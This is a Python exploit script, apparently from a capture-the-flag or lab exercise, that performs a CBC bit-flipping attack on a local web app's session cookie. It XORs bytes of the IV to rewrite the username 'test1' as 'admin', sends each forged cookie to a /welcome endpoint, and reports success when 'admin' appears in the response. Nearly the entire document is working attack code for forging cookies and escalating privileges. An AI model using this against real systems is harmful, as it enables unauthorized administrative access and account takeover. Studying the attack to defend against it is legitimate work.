import urllib.request
import urllib.parse

def test_cookie(cookie_hex):
    """Test a cookie on /welcome endpoint"""
    url = 'http://127.0.0.1:32835/welcome'
    
    # Create cookie header
    headers = {
        'Cookie': f'session={cookie_hex}'
    }
    
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as response:
            body = response.read().decode('utf-8')
            status = response.getcode()
            return status, body
    except Exception as e:
        return None, str(e)

def bitflip_cookie(cookie_hex, old_str="test1", new_str="admin"):
    """Flip bits in IV to modify first block of plaintext"""
    cookie_bytes = bytes.fromhex(cookie_hex)
    iv = bytearray(cookie_bytes[:16])
    ciphertext = cookie_bytes[16:]
    
    print(f"Original cookie: {cookie_hex}")
    print(f"IV: {iv.hex()}")
    print(f"Ciphertext: {ciphertext.hex()}")
    print(f"\nAttempting to change '{old_str}' to '{new_str}'...")
    
    # Try each possible position for old_str in first 16 bytes
    for pos in range(16 - len(old_str) + 1):
        modified_iv = bytearray(iv)
        
        # Flip bits to change old_str to new_str at position pos
        for i, (old_char, new_char) in enumerate(zip(old_str, new_str)):
            modified_iv[pos + i] ^= ord(old_char) ^ ord(new_char)
        
        # Create new cookie
        new_cookie = modified_iv + ciphertext
        new_cookie_hex = new_cookie.hex()
        
        print(f"\n--- Trying position {pos} ---")
        print(f"Modified IV: {modified_iv.hex()}")
        print(f"Modified cookie: {new_cookie_hex}")
        
        # Test it on /welcome endpoint
        status, response_text = test_cookie(new_cookie_hex)
        
        if status:
            print(f"Status: {status}")
            print(f"Response length: {len(response_text)} bytes")
            
            # Check if "admin" appears in response
            if "admin" in response_text.lower():
                print(f"\n[!] SUCCESS at position {pos}!")
                print(f"[!] Found 'admin' in response")
                print(f"\nModified cookie: {new_cookie_hex}")
                print(f"\nFull response:\n{response_text}")
                return new_cookie_hex, pos, response_text
            else:
                # Show a snippet of the response to see what username appears
                snippet = response_text[:500] if len(response_text) > 500 else response_text
                print(f"Response snippet: {snippet}")
        else:
            print(f"Error: {response_text}")
    
    return None, None, None

# Use the existing session cookie
existing_cookie = "34cfddef70254826b31cf5b83d6fb384050debdc6ca0ed5cbe19022f8c629c77"
print("Using existing session cookie from authentication storage")
print(f"Cookie: {existing_cookie}\n")

# First, let's see what the original cookie shows
print("="*60)
print("Testing original cookie first to see current username:")
print("="*60)
status, original_response = test_cookie(existing_cookie)
if status:
    print(f"Status: {status}")
    print(f"Response snippet: {original_response[:400]}")
else:
    print(f"Error: {original_response}")

print(f"\n{'='*60}")
print("Now attempting bit-flipping attack...")
print("="*60)

# Try bit-flipping attack
result_cookie, position, response_text = bitflip_cookie(existing_cookie)

if result_cookie:
    print(f"\n{'='*60}")
    print("ATTACK SUCCESSFUL!")
    print(f"{'='*60}")
    print(f"Modified cookie: {result_cookie}")
    print(f"Username position in plaintext: {position}")
    print(f"\nConfirmation - Response contains 'admin': {'admin' in response_text.lower()}")
else:
    print(f"\n{'='*60}")
    print("Standard bit-flipping didn't work. Consider:")
    print(f"{'='*60}")
    print("1. Try different username positions (extended range)")
    print("2. Username format might be different (e.g., 'user=test1')")
    print("3. Try other endpoints that might display username")
    print("4. Test with fresh login to ensure cookie is valid")
